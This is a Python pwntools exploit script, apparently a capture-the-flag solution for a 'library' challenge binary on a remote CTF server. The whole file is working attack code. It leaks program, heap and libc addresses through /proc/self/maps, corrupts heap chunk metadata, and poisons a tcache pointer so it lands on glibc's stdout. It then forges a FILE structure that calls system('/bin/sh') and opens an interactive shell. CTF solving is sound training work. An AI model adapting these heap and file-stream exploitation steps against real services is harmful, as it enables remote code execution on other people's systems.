#!/usr/bin/env python3

from pwn import *

exe = ELF("./library")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

serv = "box.acmcyber.com"
port = 31369

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()

def order(name=b"A"):
    r.sendlineafter(b"choice:", b"1")
    r.recvuntil(b"id: ")
    bid = int(r.recvline().strip())
    r.sendafter(b"name:", name)
    return bid

def read(bid):
    r.sendlineafter(b"choice:", b"2")
    r.sendlineafter(b"id:", str(bid).encode())
    r.recvuntil(b"incoming!\n")
    return r.recvuntil(b"\nhope you enjoyed", drop=True)

def add(bid, sz, data=b"A"):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"id:", str(bid).encode())
    r.sendlineafter(b"length:", str(sz).encode())
    r.sendafter(b"review:", data)

def free(bid):
    r.sendlineafter(b"choice:", b"3")
    r.sendlineafter(b"id:", str(bid).encode())
    r.sendlineafter(b"[Y/n]", b"y")

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)

def main():
    r.sendlineafter(b"choice:", b"4")
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"y")
    r.sendlineafter(b"length:", str(0x18).encode())
    r.sendlineafter(b"card:", p64(0)+p64(0x1a1))
    r.sendlineafter(b"[Y/n]", b"n")
    leak = order(b"/proc/self/maps")
    exe.address = int(read(leak), 16)
    log.info(f"{hex(exe.address)=}")
    r.sendlineafter(b"choice:", b"4")
    r.sendlineafter(b"[Y/n]", b"y")
    r.sendafter(b"bio:", p64(exe.address+0x4250)*2)
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"n")
    p0 = order()
    b0 = order()
    b1 = order()
    b2 = order()
    add(b0, 0x38)
    add(b1, 0x4f8)
    add(b2, 0x68)
    free(b0)
    add(b0, 0x38, b"A"*0x30+p64(0x1a0))
    free(b1)
    add(p0, 0x190, p64(0)*3+p16(0xffff))
    r.sendlineafter(b"choice:", b"4")
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"n")
    r.sendlineafter(b"[Y/n]", b"y")
    data = read(leak)
    heap = int(data.split(b"\n")[5].split(b"-")[0], 16)
    log.info(f"{hex(heap)=}")
    libc.address = int(data.split(b"\n")[7].split(b"-")[0], 16)
    log.info(f"{hex(libc.address)=}")
    b0 = order()
    add(b0, 0x448)
    fake = order()
    v0 = order()
    v1 = order()
    v2 = order()
    b0 = order()
    b1 = order()
    b2 = order()
    pl = p64(0)+p64(0x291)+p64(heap+0xb10)*2
    add(fake, 0x48, pl)
    add(v0, 0x100)
    add(v1, 0x100)
    add(b0, 0x28)
    add(b1, 0x4f8)
    add(b2, 0x28)
    free(b0)
    add(b0, 0x28, b"A"*0x20+p64(0x290))
    free(v1)
    free(v0)
    free(b1)
    add(v2, 0x60, p64(0)*7+p64(0x111)+p64(mangle(libc.sym._IO_2_1_stdout_, heap+0xba0)))
    c0 = order()
    c1 = order()
    add(c0, 0x100)
    fake_vtable = libc.sym._IO_wfile_jumps-0x18
    stdout = libc.sym._IO_2_1_stdout_
    stdout_lock = libc.address+0x205710
    gadget = libc.address+0x1724f0
    fs = FileStructure(0)
    fs.flags = 0x3b01010101010101
    fs._IO_read_end = libc.sym.system
    fs._IO_save_base = gadget
    fs._IO_write_end = u64(b"/bin/sh\x00")
    fs._lock = stdout_lock
    fs._codecvt = stdout+0xb8
    fs._wide_data = libc.sym._IO_wide_data_1
    fs.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
    add(c1, 0x100, bytes(fs))
    r.interactive()

if __name__ == "__main__":
    main()
